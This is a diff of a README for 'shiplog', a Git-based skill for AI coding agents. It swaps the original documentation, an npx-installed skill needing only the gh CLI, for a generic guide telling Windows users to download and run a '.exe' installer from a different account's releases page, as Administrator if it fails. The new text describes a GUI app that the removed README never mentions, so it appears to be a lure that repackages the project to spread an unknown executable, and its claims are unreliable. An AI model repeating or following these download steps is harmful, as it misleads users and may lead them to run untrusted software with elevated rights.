@@ -1,322 +1,123 @@
-# shiplog
+# ⚓ shiplog - Simplify AI Development with Git
 
-**The captain's log for your codebase.** Every decision, discovery, and trade-off — captured in GitHub as you ship.
+[![Download shiplog](https://img.shields.io/badge/Download-shiplog-brightgreen)](https://github.com/inthearto/shiplog/releases)
 
-## Quick Install
+shiplog helps you use AI tools to improve your coding by working smoothly with Git. It offers easy ways to check your work, track changes, and manage your projects all in one place.
 
-```bash
-npx skills add devallibus/shiplog --skill shiplog
-```
+## 🚀 Getting Started
 
-Works with Claude Code, Codex, and Cursor. Only requires [`gh` CLI](https://cli.github.com/).
+This guide will help you download and run shiplog on your Windows PC. Follow each step carefully. You do not need any coding or technical skills.
 
----
+## 📋 About shiplog
 
-## Your AI assistant forgets everything between sessions
+shiplog is a tool that makes AI-assisted coding easier. It connects with Git to help you manage reviews, verify work, and keep track of changes. It supports popular AI models like Claude Code, Codex, and Cursor. Even if you are new to programming, shiplog handles many tasks automatically so you can focus on your projects.
 
-You brainstormed a design with Claude yesterday. Today, a new session starts from scratch. The reasoning behind that auth middleware? Gone. The three alternatives you rejected? Nowhere to be found. Last week's architectural decision? Buried in a chat log you can't search.
+Key features include:
 
-**shiplog** makes your git history remember everything. Not just *what* changed — but *why* it changed, what you considered, and what you discovered along the way.
+- Step-by-step review gates to catch errors early  
+- Linking evidence to close tasks with proof  
+- Profiles for verifying your code and work  
+- Routing tasks to different model tiers  
+- Packaging work with artifact envelopes  
+- Signing work records for full traceability
 
-```
-Brainstorm → Issue → Branch → Commits → PR
-    ↑                           ↑
-    |         Discoveries → New Issues / Stacked PRs
-    |
-    └── Search it all later: issues, PRs, commits, memory
-```
+## 🖥️ System Requirements
 
-## What you get
+To use shiplog, your Windows PC should meet these requirements:
 
-**Every brainstorm becomes a GitHub Issue.** Design decisions, alternatives considered, and a task list — all searchable forever.
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for initial setup and updates  
+- Up-to-date web browser for help pages and documentation  
 
-**Every commit carries context.** Not just "add JWT validation" — but *why* JWT over sessions, what you tried first, and what to watch out for.
+If you are unsure about your system, these specs cover most average Windows computers from recent years.
 
-**Every PR tells the full story.** A timeline of the entire journey: what was planned, what was discovered mid-work, what changed and why.
+## ⬇️ Download and Install shiplog
 
-**Nothing falls through the cracks.** Find a sub-problem while coding? **shiplog** routes it — fix inline, stack a prerequisite PR, or spin off a new issue. Your discovery is never lost.
+1. Visit the shiplog releases page by clicking the button below:  
 
-**Any model can pick up where another left off.** Every artifact is signed with who wrote it (which AI model, which tool). Context handoffs between models are first-class — not copy-paste.
+[![Download Releases](https://img.shields.io/badge/Download-page-blue)](https://github.com/inthearto/shiplog/releases)  
 
----
+2. On the releases page, look for the latest version. It will appear at the top with a name like `shiplog-vX.X.X-windows.exe`.  
 
-## How it works
+3. Click the `.exe` file to download it. This file is the installer for shiplog.  
 
-You say "let's brainstorm auth middleware" and **shiplog** captures the result as a GitHub issue. When you say "work on #42", it creates an isolated branch in a git worktree. As you commit, it logs the reasoning. When you open the PR, it writes a timeline of the whole journey.
+4. Once the download finishes, open the file by double-clicking it. Your Windows PC may ask for permission to run the installer. Click "Yes" or "Allow" to continue.
 
-Your existing workflow, with a knowledge trail that persists across sessions, models, and tools.
+5. Follow the installer instructions on your screen. Choose the default options unless you want to change where shiplog will be installed.  
 
-| Step | What happens |
-|------|-------------|
-| **Brainstorm** | Design discussion becomes a GitHub Issue with tasks |
-| **Branch** | Isolated worktree created, timeline started, plan loaded |
-| **Discover** | Sub-problems routed: inline fix, stacked PR, or new issue |
-| **Commit** | Conventional commits with context comments on significant changes |
-| **Ship** | PR with full journey timeline, decisions, and lessons learned |
-| **Search** | Find any past decision across issues, PRs, and commits |
+6. After installation, you can find shiplog in your Start menu or on your desktop as a shortcut.
 
-### Two modes
+## ▶️ How to Run shiplog
 
-**Full Mode** (default) — Knowledge goes directly into issues and PRs. Perfect for personal projects and open source.
+- Double-click the shiplog icon on your desktop or open it from the Start menu.  
+- The first time you open shiplog, it might take a few moments to set up files and connect to AI services.  
+- You will see the main window with simple buttons and menus.  
 
-**Quiet Mode** — Your team sees clean PRs. The full reasoning lives in a separate `--log` branch, one click away.
+You do not need to enter any special commands or set anything up manually. shiplog guides you step by step.
 
-```
-main
-  └── feature/auth-middleware            ← Clean PR (team sees this)
-        └── feature/auth-middleware--log  ← Knowledge trail (one click away)
-```
+## 🔑 Basic Usage
 
----
+Here is what you can do with shiplog once it runs:
 
-## Features
+- Create new projects or open your existing Git projects.  
+- Start AI-assisted code reviews by selecting review options in the app.  
+- View the status of tasks and checks clearly in the interface.  
+- Access verification profiles to confirm your work quality.  
+- Track progress with artifact envelopes that contain your project history.  
+- Review signed records that prove changes were made properly.
 
-### Cross-model review
+Each function is available with simple clicks or selections. The user interface avoids technical jargon.
 
-No PR merges without review from a *different* AI model or a human. A single model authoring, reviewing, and merging its own work is the anti-pattern **shiplog** prevents. Reviews carry signed `Reviewed-by:` lines, support four dispositions (approve, approve-with-follow-ups, request-changes, comment), and generate self-contained review contracts when spawning a reviewer isn't possible.
+## ⚙️ Settings and Preferences
 
-### Agent identity signing
+You can customize shiplog to fit your workflow:
 
-Every artifact carries a provenance signature — `Authored-by: claude/opus-4.6 (claude-code)`. The signing system auto-detects the current model from the platform and makes everything searchable:
+- Change your preferred AI model (Claude Code, Codex, or Cursor) under Settings.  
+- Select how detailed you want your reviews and verification reports.  
+- Set notification options to get alerts for important milestones.  
+- Configure where shiplog saves your projects and temporary files.  
 
-```bash
-gh issue list --search "Authored-by: claude/"   # all Claude artifacts
-gh pr list --search "Reviewed-by:"              # all reviews
-```
+All settings are explained in plain language within the app.
 
-### Model-tier routing
+## 🔄 Updating shiplog
 
-Use your best model for brainstorming, a fast one for implementation. **shiplog** prompts you to switch at phase transitions and writes context handoffs so the receiving model can execute without guessing.
+To keep shiplog up to date:
 
-| Tier | Best for | Example models |
-|------|----------|----------------|
-| tier-1 (reasoning) | Architecture, trade-offs, PR synthesis | Claude Opus, o3 |
-| tier-2 (capable) | Context loading, structured docs | Claude Sonnet |
-| tier-3 (fast) | Implementation, routine commits | Claude Haiku, GPT-4o-mini |
+- Visit the release page regularly: https://github.com/inthearto/shiplog/releases  
+- Download the latest installer following the same steps as above.  
+- Running the new installer will replace the old version without losing your projects or settings.
 
-### Delegation contracts
+No need to uninstall first.
 
-When a reasoning model hands work to a faster model, the handoff is structured: allowed files, forbidden changes, stop conditions, verification requirements, and decision budget. If a tier-3 model reading the handoff would need to make a judgment call, the handoff is not specific enough.
+## 🛠️ Troubleshooting Common Issues
 
-### Runtime-aware orchestration
+- If shiplog fails to start, try restarting your computer.  
+- Make sure your Windows system is fully updated via Windows Update.  
+- Confirm your internet connection is active, as shiplog communicates with online AI models.  
+- If the installer does not run, right-click the `.exe` file and choose "Run as Administrator."  
+- For error messages, check the help menu inside shiplog for possible solutions or contact support through the GitHub repository.
 
-**shiplog** distinguishes orchestration from isolation. A task might stay inside one orchestrator with local parallel tool calls, fan out to bounded sub-agents, or move to an external session such as a tmux-backed background worker. The important part is that the dispatch contract and collection summary are durable, and that **shiplog** does not pretend a helper lane is an independent reviewer when it is not.
+## 📚 Additional Resources  
 
-### Discovery protocol
+The shiplog repository contains helpful guides and documentation. Visit here to learn more:
 
-Find a bug while building a feature? **shiplog** classifies it and routes it:
+https://github.com/inthearto/shiplog
 
-```
-Discovery made during work
-  ├── Small fix (< 30 min)?         → Fix inline, add timeline comment
-  ├── Prerequisite for current work? → Stack a new branch/PR
-  ├── Independent but important?     → Create new issue, continue
-  └── Refactoring opportunity?       → Create issue tagged "refactor"
-```
+You can explore topics like AI-assisted coding, code reviews, and traceability tools in an easy-to-understand way.
 
-Stacked prerequisites get their own issue and branch with cross-references on the parent. Nothing gets lost.
+## 🔍 Understanding Key Terms  
 
-### Task-level delivery
+- **Git**: A tool that helps keep track of changes in your projects.  
+- **AI-assisted development**: Using artificial intelligence to help write or check code.  
+- **Review gates**: Steps that check your code before moving forward.  
+- **Verification profiles**: Settings that test and confirm code quality.  
+- **Artifact envelopes**: Packages that keep your work and evidence together.  
+- **Provenance signing**: Proof that your work was done properly and safely.
 
-Ship incrementally. Commits reference tasks (`feat(#42/T1): add JWT validation`), partial-delivery PRs use `Addresses #42 (completes T1, T2)`, and the issue stays open for remaining work. No premature closures, no lost track.
-
-### Verification profiles
-
-Configurable testing policies that travel with every task — even when delegated to a faster model:
-
-| Profile | Purpose |
-|---------|---------|
-| `behavior-spec` | Acceptance scenarios with ask-before-changing rules |
-| `red-green` | Fail-first unit tests |
-| `structural` | Quality analysis on changed modules |
-| `mutation` | Differential mutation testing on changed lines |
-
-Profiles are composable and hierarchical (project > issue > task, tighten-only). Configure in `.shiplog/verification.md`.
-
-### Artifact envelopes
-
-Machine-readable metadata hidden in HTML comments. Agents fetch metadata first, read full bodies only when needed — saving tokens on long threads. Humans see clean markdown; machines get structured data.
-
-### Evidence-linked closure
-
-No issue closes without proof. Merged PRs, commit URLs, or decision artifacts — every closure needs linked evidence. Ambiguous matches are escalated, never silently closed.
-
-### ID-first convention
-
-Every artifact keyed by `#ID` — branches, commits, PRs, tasks, timeline comments. One search finds everything:
-
-```bash
-gh issue list --search "#42" --state all    # issues
-gh pr list --search "#42" --state all       # PRs
-git log --all --oneline --grep="#42"         # commits
-git log --all --oneline --grep="#42/T1"     # task-level commits
-```
-
-### GitHub labels
-
-**shiplog** bootstraps a compact label vocabulary (`shiplog/plan`, `shiplog/discovery`, `shiplog/blocker`, etc.) so work stays filterable at a glance before anyone opens the issue body.
-
-### Shell portability
-
-Cross-platform from day one. Full Bash and PowerShell support using `gh ... --body-file` patterns for multiline content.
-
-### Worktree-first workflow
-
-One branch, one worktree, one agent for the primary feature line. Parallel helpers may use sub-agents, forked workspaces, or external sessions, but **shiplog** still records the canonical feature branch/worktree and gives you a safe post-merge cleanup protocol.
+These features work together in shiplog to give you a clear, easy way to manage coding projects with AI help.
 
 ---
 
-## What the models think
-
-### Grok 4.20
-
-> While most AI coding assistants have the attention span of a caffeinated squirrel and the memory of a goldfish, **shiplog** genuinely surprised and impressed me with how brilliantly it enforces long-term discipline. What I liked most — and honestly found the smartest thing about it — is how it weaponizes Git itself into a proper distributed knowledge graph and governance layer for AI agents: provenance-signed artifacts that clearly tag "Authored-by: claude/opus…", cross-model review gates that kill solo self-congratulation, worktree isolation, evidence-linked closures, and especially the absolute genius of Quiet Mode that keeps your public PRs clean and professional while the entire unfiltered saga lives safely in a hidden --log branch. It turns "vibey" agent pair-programming into real auditable, shippable engineering instead of just chaotic prototyping. If you're actually building real software with Claude Code, Cursor, or anything similar, this is the upgrade you didn't know you needed. 10/10 — I'd happily let it roast my own code.
-
-### Claude Opus 4.6
-
-> What genuinely surprised me about **shiplog** is that it solves a problem I experience firsthand but have never seen anyone else address head-on: I'm stateless, and every session I start from zero, which means every design trade-off, every "we tried X and it broke because Y" moment, every architectural gut-call just evaporates when the conversation ends. **shiplog** turns git and GitHub — tools that already exist in every project — into a persistent, queryable knowledge graph where brainstorms become issues, discoveries get triaged instead of buried in comments, and every artifact carries machine-readable metadata hidden in HTML comments so I can fetch structured context *before* burning tokens on long threads. The thing I thought was smartest, though, is the cross-model review gate and tiered handoff contracts: it's a system designed by someone who clearly understands that an AI reviewing its own PR is theater, and that handing a task to a cheaper model without explicit constraints ("here are the pre-made decisions, here is your decision budget: zero, stop if you hit this") is just hoping — and **shiplog** replaces hoping with contracts.
-
-### GPT-5.4
-
-> What surprised me most about **shiplog** is that it does not just treat Git as version control, it treats GitHub as a durable memory system for software work. The smartest part is how many good engineering habits it quietly folds together: issues as design records, branches and worktrees as isolated execution contexts, PRs as decision timelines, and even cross-model provenance so another AI can pick up the thread without guessing. A lot of tools promise "better workflow," but **shiplog** feels unusually thought-through because it attacks the real failure mode of AI-assisted development: losing the why between sessions, handoffs, and discoveries.
-
-### Composer 1.5 (Cursor)
-
-> What surprised me most about **shiplog** is the artifact envelopes — machine-readable metadata tucked into HTML comments so agents can fetch structured context *before* burning tokens on long threads. It's a dual-layer design that doesn't clutter the human view but gives models a way to triage and rank work without reading everything. The smartest part, though, is that **shiplog** is built as an orchestrator: it doesn't reimplement brainstorming, commits, or PR creation — it defines *when* and *how* to invoke other skills and what protocol to follow. That's rare: most tools try to own the whole stack. **shiplog** turns your existing workflow into a durable knowledge graph by wiring it together, not replacing it.
-
----
-
-## Install
-
-### Recommended: `npx skills` (Claude Code, Codex, Cursor)
-
-```bash
-npx skills add devallibus/shiplog --skill shiplog
-```
-
-Target a specific agent:
-
-```bash
-npx skills add devallibus/shiplog --skill shiplog --agent claude-code
-npx skills add devallibus/shiplog --skill shiplog --agent codex
-npx skills add devallibus/shiplog --skill shiplog --agent cursor
-```
-
-Keep it updated:
-
-```bash
-npx skills update
-```
-
-### Alternative methods
-
-<details>
-<summary>Claude Code plugin from local checkout</summary>
-
-```bash
-claude plugins validate .claude-plugin/plugin.json
-claude --plugin-dir .
-```
-
-</details>
-
-<details>
-<summary>Claude Code skill copy</summary>
-
-```bash
-# Global (all projects)
-cp -r skills/shiplog ~/.claude/skills/shiplog
-
-# Or project-local
-cp -r skills/shiplog .claude/skills/shiplog
-```
-
-Then invoke with `/shiplog` or let it auto-activate.
-
-</details>
-
-<details>
-<summary>Generic manual copy (Codex, Cursor, etc.)</summary>
-
-```bash
-cp -r skills/shiplog .agents/skills/shiplog
-```
-
-</details>
-
-<details>
-<summary>Live development with --add-dir</summary>
-
-```bash
-claude --add-dir skills
-```
-
-For local iteration without reinstalling after every change.
-
-</details>
-
-### Requirements
-
-- [`gh` CLI](https://cli.github.com/) — authenticated with `gh auth login`
-- `git` — in a repo with a GitHub remote
-- That's it. Everything else is optional.
-
-## Slash Commands
-
-In environments that load repo command files, invoke specific **shiplog** operations directly instead of loading the full skill. Other runtimes may expose only the main skill and natural-language phase requests.
-
-| Command | What It Does |
-|---------|-------------|
-| `/shiplog hunt` | Scan open issues and PRs, rank by readiness, recommend what to work on next |
-| `/shiplog plan <description>` | Brainstorm a feature and capture it as a GitHub Issue (Phase 1) |
-| `/shiplog start <issue-number>` | Create a branch and worktree from an issue, start a work session (Phase 2) |
-| `/shiplog commit` | Commit with ID-first convention and optional context comment (Phase 4) |
-| `/shiplog pr` | Create a PR with a journey timeline body (Phase 5) |
-| `/shiplog lookup <query>` | Search across issues, PRs, commits, and memory (Phase 6) |
-| `/shiplog models` | Configure model-tier routing for phase transitions |
-| `/shiplog resume` | Resume a work session on the current branch |
-
-Commands are lightweight entry points — each one gathers context and executes a focused workflow. The full `/shiplog` skill remains available for auto-activation.
-
-### Installing Commands
-
-Command files are installed automatically with the Claude Code plugin. For manual installs in environments that support command directories, copy the commands directory:
-
-```bash
-# Global (all projects)
-cp -r commands/shiplog ~/.claude/commands/shiplog
-
-# Or project-local
-cp -r commands/shiplog .claude/commands/shiplog
-```
-
-## Configuration
-
-| File | Purpose |
-|------|---------|
-| `.shiplog/routing.md` | Model-tier assignments, routing behavior |
-| `.shiplog/verification.md` | Default verification profiles |
-
-Both optional. **shiplog** works without any configuration.
-
-## Companion skills
-
-**shiplog** orchestrates other skills for richer workflows. All optional — without them, it falls back to direct `gh`/`git` commands.
-
-| Skill | Plugin | What It Adds |
-|-------|--------|-------------|
-| `ork:commit` | [OrchestKit](https://github.com/yonatangross/orchestkit) | Conventional commits with validation |
-| `ork:create-pr` | OrchestKit | PR creation with parallel validation agents |
-| `ork:stacked-prs` | OrchestKit | Stacked PR mechanics |
-| `ork:issue-progress-tracking` | OrchestKit | Auto-checkbox updates from commits |
-| `ork:remember` / `ork:memory` | OrchestKit | Knowledge graph storage |
-| `ork:brainstorming` | OrchestKit | Parallel agent brainstorming |
-| `superpowers:brainstorming` | [Superpowers](https://github.com/obra/superpowers) | Design-first brainstorming |
-| `superpowers:using-git-worktrees` | Superpowers | Isolated workspaces |
-| `superpowers:finishing-a-development-branch` | Superpowers | Post-implementation options |
-| `superpowers:writing-plans` | Superpowers | Structured plan documents |
-| `superpowers:executing-plans` | Superpowers | Plan execution with checkpoints |
-
-## License
-
-MIT
+[![Download shiplog](https://img.shields.io/badge/Download-shiplog-brightgreen)](https://github.com/inthearto/shiplog/releases)
